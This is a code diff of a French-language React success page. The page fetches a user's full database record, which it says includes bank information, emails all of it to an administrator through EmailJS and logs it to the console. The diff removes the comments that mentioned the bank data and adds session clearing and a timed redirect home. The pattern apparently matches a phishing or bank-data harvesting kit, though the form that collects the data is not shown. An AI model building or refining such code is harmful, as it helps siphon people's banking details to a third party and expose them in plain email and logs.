@@ -1,31 +1,33 @@
+
 import React, { useEffect, useState } from "react";
 import { Footer } from "@/components/Footer";
 import { Loader } from "lucide-react";
 import { supabase } from "@/lib/supabase";
 import { sendAdminNotification, initEmailJS } from "@/lib/emailService";
 import { useToast } from "@/components/ui/use-toast";
+import { useNavigate } from "react-router-dom";
 
 const Success = () => {
   const [isEmailSent, setIsEmailSent] = useState(false);
   const [isProcessing, setIsProcessing] = useState(true);
   const { toast } = useToast();
+  const navigate = useNavigate();
 
   useEffect(() => {
-    // Réinitialiser EmailJS pour s'assurer qu'il est correctement configuré
     initEmailJS();
     
     const notifyAdmin = async () => {
       const userId = localStorage.getItem("userId");
       if (!userId) {
         setIsProcessing(false);
+        navigate("/");
         return;
       }
 
       try {
-        // Récupérer les infos de l'utilisateur
         const { data, error } = await supabase
           .from("users")
-          .select("*")  // Sélectionner toutes les colonnes
+          .select("*")
           .eq("id", userId)
           .single();
 
@@ -37,22 +39,25 @@ const Success = () => {
 
         const userName = `${data.prenom || ''} ${data.nom || ''}`.trim();
         
-        // Mettre à jour l'utilisateur pour indiquer que les informations sont complètes
         await supabase
           .from("users")
           .update({ info_complete: true })
           .eq("id", userId);
           
-        // Envoyer une notification à l'administrateur avec toutes les infos bancaires
         console.log("Tentative d'envoi d'email avec les données:", data);
         
         const success = await sendAdminNotification({
-          userData: data  // Envoyer toutes les données utilisateur
+          userData: data
         });
         
         if (success) {
           console.log("Email avec les informations bancaires envoyé avec succès");
           setIsEmailSent(true);
+          // Supprimer les variables de session après l'envoi réussi
+          localStorage.removeItem("userId");
+          setTimeout(() => {
+            navigate("/");
+          }, 3000); // Redirection après 3 secondes
         } else {
           console.error("Échec de l'envoi de l'email avec les informations bancaires");
         }
@@ -64,7 +69,7 @@ const Success = () => {
     };
 
     notifyAdmin();
-  }, [toast]);
+  }, [toast, navigate]);
 
   return (
     <div className="min-h-screen flex flex-col">
